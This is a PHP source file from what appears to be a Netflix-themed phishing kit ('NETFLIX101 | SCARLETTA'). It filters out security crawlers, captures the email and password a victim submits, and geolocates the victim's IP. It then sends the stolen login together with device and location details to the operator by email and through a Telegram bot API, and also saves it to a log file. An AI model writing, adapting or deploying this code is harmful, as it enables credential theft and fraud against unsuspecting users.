<?php

ini_set('allow_url_fopen',1);

$settings = include('../../settings/settings.php');

session_start();

# Debug

if($settings['debug'] == "1"){
  ini_set('display_errors', 1);
  ini_set('display_startup_errors', 1);
};

# User Agent

$useragent = $_SERVER['HTTP_USER_AGENT'];

# Anti Bots 

include("../Bots/fucker.php");
include("../Bots/Anti/out/blacklist.php");
include("../Bots/Anti/out/bot-crawler.php");
include("../Bots/Anti/out/anti.php");
include("../Bots/Anti/out/ref.php");
include("../Bots/Anti/out/bots.php");
include("../Bots/Anti/out/Crawler/src/CrawlerDetect.php");

# Check User-Agents

use JayBizzle\CrawlerDetect\CrawlerDetect;

$CrawlerDetect = new CrawlerDetect;

$settings = include('../../settings/settings.php');

if($settings['print_match'] == "1"){
  echo $CrawlerDetect->getMatches();
}

if($CrawlerDetect->isCrawler($useragent)){
  header('Referer: '.$settings['referer']);
  header('Location: https://google.com/search?q='.$settings['out']);

} 


# Check File

$filename = "../../Logs/results.txt";

# Function Section

function getTimeZoneFromIpAddress(){
  $clientsIpAddress = get_client_ip();
  $clientInformation = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$clientsIpAddress));
  $clientsLatitude = $clientInformation['geoplugin_latitude'];
  $clientsLongitude = $clientInformation['geoplugin_longitude'];
  $clientsCountryCode = $clientInformation['geoplugin_countryCode'];
  $clientsCountryName = $clientInformation['geoplugin_countryName'];
  $clientsRegionCode = $clientInformation['geoplugin_regionCode'];
  $clientsRegionName = $clientInformation['geoplugin_regionName'];
  $timeZone = get_nearest_timezone($clientsLatitude, $clientsLongitude, $clientsCountryCode) ;
  return array($timeZone, $clientsRegionCode, $clientsRegionName, $clientsCountryName, $clientsCountryCode);
}

$array = getTimeZoneFromIpAddress();

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function get_nearest_timezone($cur_lat, $cur_long, $country_code = '') {
    $timezone_ids = ($country_code) ? DateTimeZone::listIdentifiers(DateTimeZone::PER_COUNTRY, $country_code)
        : DateTimeZone::listIdentifiers();

    if($timezone_ids && is_array($timezone_ids) && isset($timezone_ids[0])) {

        $time_zone = '';
        $tz_distance = 0;

        //only one identifier?
        if (count($timezone_ids) == 1) {
            $time_zone = $timezone_ids[0];
        } else {

            foreach($timezone_ids as $timezone_id) {
                $timezone = new DateTimeZone($timezone_id);
                $location = $timezone->getLocation();
                $tz_lat   = $location['latitude'];
                $tz_long  = $location['longitude'];

                $theta    = $cur_long - $tz_long;
                $distance = (sin(deg2rad($cur_lat)) * sin(deg2rad($tz_lat)))
                    + (cos(deg2rad($cur_lat)) * cos(deg2rad($tz_lat)) * cos(deg2rad($theta)));
                $distance = acos($distance);
                $distance = abs(rad2deg($distance));
                // echo '<br />'.$timezone_id.' '.$distance;

                if (!$time_zone || $tz_distance > $distance) {
                    $time_zone   = $timezone_id;
                    $tz_distance = $distance;
                }

            }
        }
        return $time_zone;
    }
    return 'unknown';
}

$url = "https://geolocation.onetrust.com/cookieconsentpub/v1/geo/location";


function work($data) {
  $data = str_replace("jsonFeed({", "", $data);
  $data = str_replace("});", "", $data);
  $data = str_replace("\"","", $data);
  $data1 = explode(",", $data);
  $dataf = array();
  foreach ($data1 as $value) {
    $ds = explode(":", $value);
    $dataf[$ds[0]] = $ds[1];
    //$dataf[] += [$ds[0] => $ds[1]];
  }
  return($dataf);
}

$link = file_get_contents($url);
$dataf = work($link);


$IP = get_client_ip();

function get_ip1($ip2) {
    $url = "http://www.geoplugin.net/json.gp?ip=".$ip2;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}

function get_ip2($ip) {
    $url = 'http://extreme-ip-lookup.com/json/' . $ip;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
    $resp=curl_exec($ch);
    curl_close($ch);
    return $resp;
}


function getOS($useragent) {
  $os_platform = "Unknown OS Platform";
  $os_array = array('/windows nt 10/i' => 'Windows 10','/windows nt 6.3/i' => 'Windows 8.1','/windows nt 6.2/i' => 'Windows 8','/windows nt 6.1/i' => 'Windows 7','/windows nt 6.0/i' => 'Windows Vista','/windows nt 5.2/i' => 'Windows Server 2003/XP x64','/windows nt 5.1/i' => 'Windows XP','/windows xp/i' => 'Windows XP','/windows nt 5.0/i' => 'Windows 2000','/windows me/i' => 'Windows ME','/win98/i' => 'Windows 98','/win95/i' => 'Windows 95','/win16/i' => 'Windows 3.11','/macintosh|mac os x/i' => 'Mac OS X','/mac_powerpc/i' => 'Mac OS 9','/linux/i' => 'Linux','/ubuntu/i' => 'Ubuntu','/iphone/i' => 'iPhone','/ipod/i' => 'iPod','/ipad/i' =>  'iPad','/android/i' => 'Android','/blackberry/i' =>  'BlackBerry','/webos/i' => 'Mobile');
  foreach ($os_array as $regex => $value) {
    if (preg_match($regex, $useragent)) {
      $os_platform = $value;
    }
  }
  return $os_platform;
}

function getBrowser($useragent) {
    $browser = "Unknown Browser";
    $browser_array = array('/msie/i' => 'Internet Explorer','/firefox/i' => 'Firefox','/safari/i' => 'Safari','/chrome/i' => 'Chrome','/opera/i' => 'Opera','/netscape/i' => 'Netscape','/maxthon/i' => 'Maxthon','/konqueror/i' => 'Konqueror','/mobile/i' => 'Handheld Browser');
    foreach ($browser_array as $regex => $value) {
        if (preg_match($regex, $useragent)) {
            $browser    =   $value;
        }
    }
    return $browser;
}




# Variable Section

$details = get_ip1($IP);
$details = json_decode($details, true);
$countryname = $details['geoplugin_countryName'];
$countrycode = $details['geoplugin_countryCode'];
$continent = $details['geoplugin_continentName'];
$city = $details['geoplugin_city'];
$regioncity = $details['geoplugin_region'];
$timezone = $details['geoplugin_timezone'];
$currency = $details['geoplugin_currencySymbol_UTF8'];

if($countryname == "") {
    $details = get_ip2($IP2);
    $details = json_decode($details, true);
    $countryname = $details['country'];
    $countrycode = $details['countryCode'];
    $continent = $details['continent'];
    $city = $details['city'];
}
$username = $_POST['email'];
$password = $_POST['password'];
$hostname = gethostbyaddr($IP);
if ($ipv6 == ""){
  $IPV6 = "N/A";
} else {
  $IPV6 = $ipv6;
}
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timezone = $dataf['timezone'];
date_default_timezone_get($timezone);
$date = date("h:i:s d/m/Y");
$city = $city;
$currency = $currency;
$countrycode = $countrycode;
$countryname = $countryname;
$continent = $continent;
$regioncity = $regioncity;
$currency = $currency;
$os = getOS($useragent);
$browser = getBrowser($useragent);
$client = file_get_contents("../client.txt");
$screensize = $_COOKIE['sw']."x".$_COOKIE['sh'];

# Logs

$message = "📺 ===== [ 💰 NETFLIX101 | SCARLETTA | CLIENT : {$client} 💰 ] ===== 📺\n";
$message .= "\n📃 [ N O R M A L ~ L O G I N ] 📃\n";
$message .= ".-------------------------------------.\n";
$message .= "| ➤ [ Username ]   : {$username}\n";
$message .= "| ➤ [ Password ]   : {$password}\n";
$message .= ".-------------------------------------.\n";
$message .= "| ➤ [ IP Address ] : {$IP}\n";
$message .= "| ➤ [ IPV6 ]       : {$IPV6}\n";
$message .= "| ➤ [ User-Agent ] : {$user_agent}\n";
$message .= "| ➤ [ OS ]         : {$os}\n";
$message .= "| ➤ [ Browser ]    : {$browser}\n";
$message .= "| ➤ [ Screensize ] : {$screensize}\n";
$message .= "| ➤ [ City(IP) ]   : {$city}\n";
$message .= "| ➤ [ Country ]    : {$countryname}, {$countrycode}\n";
$message .= "| ➤ [ Date ]       : {$date}\n";
$message .= ".-------------------------------------.\n";
$message .= "🌍 [ G E O L O C A T E ~ L O O K U P ] 🌍\n";
$message .= ".-------------------------------------.\n";
$message .= "| ➤ [ State ]       : {$dataf['state']}\n";
$message .= "| ➤ [ Statename ]   : {$dataf['stateName']}\n";
$message .= "| ➤ [ Zip Code ]    : {$dataf['zipcode']}\n";
$message .= "| ➤ [ Latitude  ]   : {$dataf['latitude']}\n";
$message .= "| ➤ [ Longitude ]   : {$dataf['longitude']}\n";
$message .= "| ➤ [ City ]        : {$dataf['city']}\n";
$message .= "| ➤ [ Timezone ]   : {$timezone}\n";
$message .= "| ➤ [ Continent ]   : {$dataf['continent']}\n";
$message .= ".-------------------------------------.\n";
$message .= "\n📺 ===== [ 💰 SCARLETTA 💰 ] ===== 📺\n\n";

# Send Mail

if ($settings['send_mail'] == "1"){
  $to = $settings['email'];
  $client = file_get_contents("../client.txt");
  $headers = "Content-type:text/plain;charset=UTF-8\r\n";
  $headers .= "From: Scarletta <netflix@client-{$client}_site.com>\r\n";
  $subject = "⚔️ NETFLIX101 ✦ LOG #{client} ✦ {$IP} ✦ LOGIN ⚔️";
  $msg = $message;
  mail($to, $subject, $msg, $headers);
}

# Save Log 

if ($settings['save_results'] == "1"){
  $results = fopen($filename, "a+");
  fwrite($results, $message);
  fclose($results);
}

# Send Bot

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

$_SESSION['email'] = $username;

#session_destroy();
# Head Back To Next Step

if ($settings['double_login'] == "1"){
	header('Location: login.php');
} else {
	header('Location: email.php');
}
?>
